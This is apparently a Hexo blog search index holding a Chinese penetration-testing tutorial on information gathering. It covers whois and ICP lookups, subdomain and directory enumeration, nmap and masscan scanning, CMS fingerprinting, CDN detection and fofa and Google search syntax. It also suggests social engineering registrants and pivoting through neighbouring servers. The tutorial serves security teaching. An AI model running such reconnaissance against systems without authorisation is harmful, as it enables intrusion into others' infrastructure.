<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web安全基础</title>
      <link href="/2023/012220963.html"/>
      <url>/2023/012220963.html</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集1"><a href="#信息收集1" class="headerlink" title="信息收集1"></a>信息收集1</h2><p>信息收集——渗透测试的灵魂</p><p>为什么要信息收集？</p><p>有句话说“知己知彼，百战不殆”。最了解你的人往往都是你的对手。</p><p>当你所掌握到的信息比别人多且更详细的时候那么你就占据了先机，这一条不仅仅用于商业、战争、渗透测试中也适用。</p><p>信息收集的方向、究竟收集什么？</p><p>以 <a href="http://www.secdriver.com/">http://www.secdriver.com/</a> 这个网站为例，你知道这个网站是谁的(注册人/机构)吗？当查到了网站所属的机构是某个公司后，那你能找到这个公司旗下拥有的其它网站吗？你访问网站后发现他是某个机构的官网，那你能发现这个网站使用了什么编程语言，php还是jsp；使用了什么WEB容器，apache还是iis ; 网站的后台地址是什么；网站使用的服务器是windows还是linux，服务器的ip是什么, 这个ip上都开放了哪些端口?；这个网站是不是某一款流行的cms产品？。</p><p>带着这些问题，让我们开始今天的学习 ~~~</p><h3 id="1-域名信息查询"><a href="#1-域名信息查询" class="headerlink" title="1.域名信息查询"></a><strong>1.域名信息查询</strong></h3><h4 id="什么是域名？"><a href="#什么是域名？" class="headerlink" title="什么是域名？"></a><strong>什么是域名？</strong></h4><p><strong>域名</strong>（<strong>Domain Name</strong>），又称<strong>网域</strong>，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</p><p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p><p>计算机是不认识域名的，域名只是为了方便人们记忆而进行创建的</p><p>域名解析示例：secdriver.com -&gt; DNS 服务器 114.114.114.114 -&gt; 47.94.98.63</p><p>域名ip查询：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ping secdriver.com  # ping DNS解析nslookup secdriver.com  # nslookup DNS解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C1.PNG" alt=" "></p><h4 id="域名级别"><a href="#域名级别" class="headerlink" title="域名级别"></a><strong>域名级别</strong></h4><p>域名可分为不同级别，包括顶级域名、二级域名等</p><h5 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a><strong>顶级域名</strong></h5><p><strong>国家顶级域名</strong>（national top-level domainnames，简称nTLDs），200多个国家都按照ISO3166国家代码分配了顶级域名，例如中国是 .cn，美国是 .us，日本是 .jp 等</p><p><strong>国际顶级域名</strong>（international top-level domain names，简称iTDs），例如表示工商企业的 .com，表示网络提供商的 .net，表示顶级标杆、个人的 .top，表示非盈利组织的.org等</p><h5 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a><strong>二级域名</strong></h5><p>二级域名是指顶级域名之下的域名，在国际顶级域名下，它是指域名注册人的网上名称，例如”.ibm”，”.yahoo”，”.microsoft”等；在国家顶级域名下，它是表示注册企业类别的符号</p><h5 id="三级域名"><a href="#三级域名" class="headerlink" title="三级域名"></a><strong>三级域名</strong></h5><p>三级域名用字母（a～z）、数字（0～9）和连接符（－）组成， 各级域名之间用实点（.）连接，三级域名的长度不能超过20个字符，域名长度有限，最多可注册63个字符，域名总长度不能超过253个字符</p><h4 id="什么是子域名？"><a href="#什么是子域名？" class="headerlink" title="什么是子域名？"></a><strong>什么是子域名？</strong></h4><p><strong>子域名</strong>（<strong>Subdomain</strong>）是在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域 .com 的子域。</p><p>子域名示例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">主域名：secdriver.com子域名：www.secdriver.comedu.secdriver.commail.secdriver.comctf.secdriver.com...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a><strong>IP反查域名</strong></h4><p>通过IP可以反查出绑定在该网站的域名，来发现更多资产</p><p>ip138: <a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p>webscan: <a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p>VirusTotal: <a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><h4 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a><strong>Whois查询</strong></h4><p>whois指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱。知道目标的域名之后，我们要做的第一件事就是获取域名的whois信息，因为域名注册人可能是网站管理员，可以尝试社工、套路，查询是不是注册了其他域名扩大攻击范围。</p><h5 id="查询网站"><a href="#查询网站" class="headerlink" title="查询网站"></a><strong>查询网站</strong></h5><p>爱站工具网: <a href="https://whois.aizhan.com/">https://whois.aizhan.com</a></p><p>站长之家: <a href="http://whois.chinaz.com/">http://whois.chinaz.com</a></p><p>VirusTotal: <a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等。</p><h5 id="kali工具"><a href="#kali工具" class="headerlink" title="kali工具"></a><strong>kali工具</strong></h5><p>whois 域名</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">whois www.secdriver.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ICP备案信息查询"><a href="#ICP备案信息查询" class="headerlink" title="ICP备案信息查询"></a><strong>ICP备案信息查询</strong></h4><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p><p>常用的网站有以下几个：</p><p>工业和信息化部政务服务平台：<a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p><p>全国互联网安全管理平台：<a href="http://www.beian.gov.cn/portal/recordQuery">http://www.beian.gov.cn/portal/recordQuery</a></p><p>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></p><h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a><strong>子域名收集</strong></h4><p>假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标。</p><h5 id="网站查询子域名"><a href="#网站查询子域名" class="headerlink" title="网站查询子域名"></a><strong>网站查询子域名</strong></h5><p>VirusTotal <a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p><p>fofa <a href="https://fofa.info/">https://fofa.info/</a></p><h5 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h5><p>Layer子域名挖掘机</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C4.PNG" alt="4"></p><h3 id="2-端口信息"><a href="#2-端口信息" class="headerlink" title="2.端口信息"></a><strong>2.端口信息</strong></h3><p>计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口，计算机有0~65535，共计65536个端口。</p><p>端口作为服务器和客户端交互的接口，起着非常重要的作用。一些常见的端口标识出服务器开启了什么服务，比如3389端口开启，可以认为服务器系统为windows并且开启了远程服务的功能。所以，端口扫描在渗透测试中是非常重要的。</p><h4 id="插件探测"><a href="#插件探测" class="headerlink" title="插件探测"></a><strong>插件探测</strong></h4><h5 id="Fofa-Pro-view"><a href="#Fofa-Pro-view" class="headerlink" title="Fofa Pro view"></a><strong>Fofa Pro view</strong></h5><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C5.png" alt="5"></p><h5 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><strong>shodan</strong></h5><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C6.png" alt="6"></p><h4 id="工具扫描-1"><a href="#工具扫描-1" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h5><p>nmap 是一款开源免费的针对大型网络的端口扫描工具，nmap可以检测目标主机是否在线、主机端口开放情况、检测主机运行的服务类型及版本信息、检测操作系统与设备类型等信息</p><p>nmap常用参数</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C2.PNG" alt="2"></p><h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap 192.168.23.1  # Nmap 默认发送⼀个arp的ping数据包，来探测⽬标主机在1-10000范围内所开放的端⼝<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a><strong>主机发现</strong></h6><p>主机发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sP 192.168.1.0&#x2F;24  # 进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试端口扫描或者操作系统探测<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a><strong>操作系统识别</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -O 192.168.23.1     # 操作系统版本探测nmap -O --osscan-limit 192.168.23.1  # 探测操作系统版本详细信息nmap -O --osscan-guess 192.168.23.1  # 猜测操作系统版本nmap -A 192.168.23.1     # 操作系统探测和服务版本探测等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sT 192.168.23.1 -p 21,22,23,53,80,135,443,445 # (默认) TCP全连接扫描,常见端口nmap -sS 192.168.23.1 -p 1-3000 --open -vv  # (常用) 快速扫描 1-3000 范围端口,只显示开放端口信息nmap -PN 192.168.23.1 -p 1-3000  # 不使用ping命令扫描nmap -PR 192.168.23.1 -p 1-3000  # arp扫描，内网中局域网防火墙不拦截，速度很快nmap -P0 192.168.23.1 -p 1-3000  # 空闲扫描，不会留下记录nmap -sV 192.168.81.148 -p 3389,5985,6588,999,21,80 -A  # 探测端口信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a><strong>格式化输出</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 使用 nmap 结果美化 model, 美化 nmap 输出的 xml 文档，使用-oX xxx.xml 或者 -oA xxx 可将结果导出为 xml 格式# 端口信息探测 + 系统探测 + 基础扫描nmap -sV -A 192.168.23.1 -p 80,88,135,139,443,445,903,1080,1688,3306,5357 -oA mysite# 格式化 xml 文档xsltproc -o mysite.html mode.xsl mysite.xml# 使用浏览器打开 html 文档firefox mysite.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a><strong>常见端口</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a><strong>masscan</strong></h5><p>masscan 是 Kali 下集成的高效扫描器 , 速度非常快</p><p>masscan 常用参数</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C3.PNG" alt="3"></p><h6 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a><strong>基本用法</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan 192.168.23.1 -p 1-3000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="枚举C段"><a href="#枚举C段" class="headerlink" title="枚举C段"></a><strong>枚举C段</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-sL 参数可以枚举网段masscan -sL 10.0.0.0&#x2F;24 &gt; c段.txtmasscan -sL 10.0.0.0&#x2F;16 &gt; b段.txtmasscan -sL 10.0.0.0&#x2F;8 &gt; a段.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h6 id="端口御剑扫描"><a href="#端口御剑扫描" class="headerlink" title="端口御剑扫描"></a><strong>端口御剑扫描</strong></h6><h3 id="3-C段和旁站"><a href="#3-C段和旁站" class="headerlink" title="3.C段和旁站"></a><strong>3.C段和旁站</strong></h3><h4 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a><strong>旁站</strong></h4><p>旁注：同服务器不同站点的渗透方案</p><p>旁站指的是网站所在服务器上部署的其他网站，同IP网站，一个IP上布置了多个网站从同台服务器上的其他网站入手，获取到服务器权限，自然就获取到了目标网站的权限</p><h4 id="C段"><a href="#C段" class="headerlink" title="C段"></a><strong>C段</strong></h4><p><strong>C段</strong>：同网段不同服务器的渗透方案</p><p>C 段嗅探指的是拿下同一C段下的服务器，也就是说是D段1-255中的一台服务器，再通过内网横向移动获取你想要的服务器权限。</p><p>例如192.168.1.66 -&gt; 192.168.1.4 能够相互通讯可以控制该网段中的192.168.1.66，再通过内网横向移动来控制 192.168.1.4 </p><p>注意：一般情况下云服务器C段的IP都是相互独立的，这些服务器分属不同用户，没有渗透的必要</p><h5 id="在线查询网站"><a href="#在线查询网站" class="headerlink" title="在线查询网站"></a><strong>在线查询网站</strong></h5><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h5 id="工具扫描C段"><a href="#工具扫描C段" class="headerlink" title="工具扫描C段"></a><strong>工具扫描C段</strong></h5><p>一般可以扫描一些常见端口，来发现C段中在线的主机，比如</p><h5 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a><strong>nmap</strong></h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -A -vv 192.168.23.1&#x2F;24    # 很慢，慎用可以加-T参数nmap -PR -vv 192.168.23.1&#x2F;24 -p 1-1000,8000-9000 --open  # arp 扫描, 速度快nmap -PN -vv 192.168.23.1&#x2F;24 -p 1-1000 --open # 不使用ping扫描，能发现禁ping主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="masscan-1"><a href="#masscan-1" class="headerlink" title="masscan"></a><strong>masscan</strong></h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan 192.168.23.1&#x2F;24 --ping   # icmp探测C段在线主机masscan 192.168.23.1&#x2F;24 -p21,22,80,137,138,139,443,445,1433,1434,1521,3306,6379,7001,8000,8080,9001 --open-only<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="御剑端口扫描"><a href="#御剑端口扫描" class="headerlink" title="御剑端口扫描"></a><strong>御剑端口扫描</strong></h5><h2 id="信息收集2"><a href="#信息收集2" class="headerlink" title="信息收集2"></a>信息收集2</h2><p>补天SRC：<a href="https://www.butian.net/">https://www.butian.net/</a></p><p>公益SRC：<a href="https://www.butian.net/Reward/plan/2">https://www.butian.net/Reward/plan/2</a></p><h3 id="目录信息收集"><a href="#目录信息收集" class="headerlink" title="目录信息收集"></a>目录信息收集</h3><ul><li><p>寻找到网站后台管理</p></li><li><p>寻找未授权界面</p></li><li><p>寻找网站更多隐藏信息</p></li><li><p>发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构</p></li><li><p>发现敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p></li></ul><h4 id="常见的后台管理页面："><a href="#常见的后台管理页面：" class="headerlink" title="常见的后台管理页面："></a>常见的后台管理页面：</h4><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C7.PNG" alt="7"></p><h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><p>Robots协议(Robots Exclusion Protocol)“网络爬虫排除标准”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，同时也记录网站所具有基本的目录</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C8.PNG" alt="8"></p><h3 id="目录扫描工具"><a href="#目录扫描工具" class="headerlink" title="目录扫描工具"></a>目录扫描工具</h3><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>dirsearch是一个基于python3的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件</p><p>依赖安装： pip install -r requirements.txt</p><p>简单使用：python dirsearch.py -u 目标地址</p><h6 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">## 基本使用-h  # 使用帮助-u  # 指定目标url，最好加上协议类型 如http https-L  # 指定url列表文件-e  # 参数指定网站类型 php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak (-e *代表所有)## 自定义选项-w  # 指定字典扫描-t  # 指定线程数（默认20）-r  # 递归扫描 扫描到目录文件会进一步向下挖掘-random-agents #使用随机UA-H  # 使用指定headers (e.g. --header &quot;Referer: example.com&quot; --header &quot;User-Agent: IE&quot;)-m  # 指定http请求方式，默认get-d  # 发送的 data 数据--cookie    # 添加 cookie--proxy  # 添加代理 e.g. --proxy 127.0.0.1:1080## 过滤扫描结果-i &#x2F;         # http 状态码白名单 (e.g. 200,300-399)-x &#x2F; --exclude-status    # 排除指定 http 状态码 （e.g.:301,403,500-599)--exclude-texts  # 文本排除响应 (e.g.: &quot;Not found&quot;, &quot;Error&quot;)--exclude-regexps   # 按regexp排除响应，用逗号分隔(e.g.: &quot;Not foun[a-z]&#123;1&#125;&quot;, &quot;^Error$&quot;)## 报告输出-o 指定报告文件输出地址--format 报告文件格式 (默认: simple, plain, json, xml,md,csv, html, sqlite)--log 输出扫描日志文件 (一般不用)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h4><p>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。对目标渗透测试过程中，目标的cms是十分重要的信息，有了目标的cms，就可以利用相关bug进行测试，进行代码审计等。</p><h4 id="识别方式"><a href="#识别方式" class="headerlink" title="识别方式"></a>识别方式</h4><p>1.网站特有文件</p><p>如/templets/default/style/dedecms.css — dedecms</p><p>2.网站独有文件的md5</p><p>如favicon.ico，但是该文件可以被修改导致不准确。</p><p>文件md5计算 certutil -hashfile filename MD5</p><p>3.网站文件命名规则</p><p>4.返回头的关键字 如 header=”rememberMe=deleteMe”</p><p>5.网页关键字</p><p>如 /data/sessions/index.html——dedecms</p><p> /data/admin/ver.txt</p><p>6.Url特征</p><p>10.网站路径特征</p><p>11.网站静态资源</p><p>12.爬虫网站目录信息</p><p><strong>指纹识别对象</strong></p><p>1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；</p><p>2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；</p><p>3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；</p><p>4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；</p><p>5、开发语言：比如PHP、Java、Ruby、Python、C#等；</p><p>6、操作系统信息：比如linux、win2008、win7、kali、centos等；</p><p>7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；</p><p>8、WAF信息：是否使用waf，如Topsec、safedog、Yundun等；</p><p>9、IP及域名信息：IP和域名注册信息、服务商信息等；</p><p>10、端口信息：有些软件或平台还会探测服务器开放的常见端口。</p><p>示例网站：<a href="http://ask.ltsec.com/">http://ask.ltsec.com/</a></p><h4 id="识别工具"><a href="#识别工具" class="headerlink" title="识别工具"></a>识别工具</h4><p>Kali工具：<strong>whatweb</strong></p><p>whatweb 域名 # 单个域名识别</p><h4 id="在线指纹识别："><a href="#在线指纹识别：" class="headerlink" title="在线指纹识别："></a>在线指纹识别：</h4><p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p><p><a href="http://pentest.gdpcisa.org/whatcms">http://pentest.gdpcisa.org/whatcms</a></p><h5 id="指纹探测插件：Wapplyzer"><a href="#指纹探测插件：Wapplyzer" class="headerlink" title="指纹探测插件：Wapplyzer"></a>指纹探测插件：Wapplyzer</h5><h4 id="CDN识别"><a href="#CDN识别" class="headerlink" title="CDN识别"></a>CDN识别</h4><h5 id="认识CDN"><a href="#认识CDN" class="headerlink" title="认识CDN"></a>认识CDN</h5><p>CDN是指内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C9.PNG" alt="9"></p><p>通过中心平台的负载均衡内容分发，调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><p>CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络内。</p><p>在用户访问网站时，利用全局负载技术将用户的访问<strong>指向距离最近的工作正常的缓存服务器上</strong>，由缓存服务器直接响应用户请求。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C10.PNG" alt="10"></p><h5 id="识别CDN"><a href="#识别CDN" class="headerlink" title="识别CDN"></a>识别CDN</h5><p>nslookup</p><p>多地ping网站：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a> <a href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p><p>在线识别：<a href="https://www.cdnplanet.com/tools/cdnfinder">https://www.cdnplanet.com/tools/cdnfinder</a></p><p>示例网站：<a href="https://royalapps.com/">https://royalapps.com/</a> 、<a href="https://taobao.com/">https://taobao.com</a></p><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><h4 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h4><p>网址：<a href="https://fofa.info/">https://fofa.info/</a></p><p><strong>高级搜索</strong></p><p>&amp;&amp; = and </p><p>可以使用括号 和 &amp;&amp; (与) 、|| (或)、 != (非)、等符号，如</p><pre class="line-numbers language-none"><code class="language-none">title&#x3D;&quot;powered by&quot; &amp;&amp; title!&#x3D;&quot;discuz&quot;body&#x3D;&quot;content&#x3D;WordPress&quot; || (header&#x3D;&quot;X-Pingback&quot; &amp;&amp; header&#x3D;&quot;&#x2F;xmlrpc.php&quot; &amp;&amp; body&#x3D;&quot;&#x2F;wp-includes&#x2F;&quot;) &amp;&amp; host&#x3D;&quot;gov.cn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>常用语法</strong></p><pre class="line-numbers language-none"><code class="language-none">domain&#x3D;&quot;qq.com&quot; #查询子域名host&#x3D;&quot;.gov.cn&quot;   #从url中搜索&quot;.gov.cn&quot;header&#x3D;&quot;thinkphp&quot; #从http头中搜索thinkphpport&#x3D;&quot;6379&quot;       #查找对应“6379”端口的资产ip&#x3D;&quot;1.1.1.1&quot;     #从ip中搜索包含“1.1.1.1”的网站ip&#x3D;&quot;220.181.111.1&#x2F;24&quot;   #查询IP为“220.181.111.1”的C网段资产status_code&#x3D;&quot;402&quot; #查询服务器状态为“402”的资产app&#x3D;&quot;通达OA网络智能办公系统&quot;   # 搜索通达OA系统country&#x3D;&quot;CN&quot;     # 搜索指定国家(编码)的资产region&#x3D;&quot;Henan&quot;   # 搜索指定行政区的资产<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="360Quake"><a href="#360Quake" class="headerlink" title="360Quake"></a>360Quake</h4><p><a href="https://quake.360.cn/">https://quake.360.cn/</a></p><h4 id="奇安信鹰图"><a href="#奇安信鹰图" class="headerlink" title="奇安信鹰图"></a>奇安信鹰图</h4><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><h4 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h4><p>基本语法</p><p><strong>AND：缺一不可</strong></p><p>谷歌的默认搜索是and逻辑，意思就是，我们在输入关键字后进行搜索时，如输入：“program google”后，会搜出包含“program”和“google”的文件内容，如图</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C11.PNG" alt="11"></p><p>基础布尔逻辑</p><p>对于一个搜索引擎来说，进行搜索的时候是要搜索到匹配到所有关键词的页面，还是包含关键词中的任意关键词就可以，取决于一个搜索引擎的一些特别算法，称之为搜索引擎的布尔逻辑默认值。</p><p><strong>OR：两者皆可</strong></p><p>而google就是用and作为默认逻辑（搜索到所有的关键词），当然这个前提是我们没有输入一些特殊的命令。如果你不确定你要搜索的内容，或者你想搜索两个中的任意一个，那么就要使用关键词“OR”。注意：OR是大写的，小写是不起作用的，而且，每一个关键词与“OR”之间是有一个空格的，我们来看一下搜索结果。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C12.PNG" alt="12"></p><p>当然，可以预想的是，google的结果要比program多得多，所以结果第一页全是有关google的内容。此外，还可以借助计算机体系语言中的“|”来代替“OR”，效果是一样的。</p><p><strong>“”</strong> <strong>：一刻都不能分割</strong></p><p>当然，如果你希望搜索“programgoogle”的内容，而不希望这两个单词之间有任何其他的内容，那么就要使用双引号把搜索的内容组成一个词组”programgoogle”来达到目的。如图所示。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C13.PNG" alt="13"></p><p>如上图所示，结果中的programgoogle都是在一起的，没有分割。当然这样的结果比较少，只有2740个，但是看图1，结果却有7亿多个。而且，大部分搜索引擎都有智能断句的功能，如果没有特殊的命令，搜索引擎会一定量的根据大众的语言使用习惯来判断你要搜索什么，而这样的做法，不仅仅没有使搜索引擎显得不听话，反而对大众来讲搜索引擎变得十分智能和高效！</p><p><strong>-</strong> <strong>：不想看到你</strong></p><p>但是如果我们只想看到“program”的内容，而不希望看到“google”的内容，就可以把“-”（减号或者破折号）应用到搜索当中去，语法为“program -google”，注意，“-”之前是有一个空格的，而其后却是和下一个关键词是紧紧相连的！搜索的结果如下图4所示。可以看得到结果中都会包含program，而不包含google</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C14.PNG" alt="14"></p><p><strong>+</strong> <strong>：就想看到你</strong></p><p>说到这里，还要提一下google的约束扩展问题了。一般来说，当输入关键词后，google会把相关网页和信息的结果呈现在我们面前。然而，有一些单词在搜索引擎中是会被智能忽略的，导致我们得不到想要的结果。比如十分常用的“www”和“the”，基本上任何一个网页上都会找到的东西，就会被google自动忽略（不要觉得这样不好，还是那个道理，在实际引用当中这样做反而显得更加高效和智能）。如果我们不想忽略这些词进行查询，就得在这些关键词的前面加上符号“+”。如下图5所示：</p><p>看上去两者好像没有什么大的区别，其实仔细比较一下搜索结果就可以看得出，加上加号的搜索结果有一万多个，而不加加号的结果却有着55亿多！而因为google和www的关联度比较高，所以在前面的结果表现的差别不大。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C15.PNG" alt="15"></p><p><strong>“?”和“*” ：占位通配符</strong></p><p>除了上述字符之外，一些搜索引擎支持一种叫做“stemming”（填充）的技术。Stemming是指在查询的关键词中添加一些通配符，通常是“<em>”，有时候也可能是“？”，这些通配符的作用是要求搜索引擎进行查询是可以返回多个不同的结果。其中通配符代表占位，可以匹配其他任意字母和单词，而其他的字或词组与用户输入的相同。如我们想要搜索“Lionel Messi”的内容，却忘记了第一个单词的一些拼写，就可以输入“”l</em>Messi””进行查询，注意：此处整个字符串是要用一个英文半角双引号括住的！结果如下图所示。　</p><p>可以看到，google自动匹配出Lionel Messi的内容并且进行了搜索。这样的方式有利于我们只能记住单词或短语的一部分的内容时使用。</p><p><img src="/2023/012220963/.%5CWeb%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C16.PNG" alt="16"></p><p><strong>特殊语法</strong></p><pre class="line-numbers language-none"><code 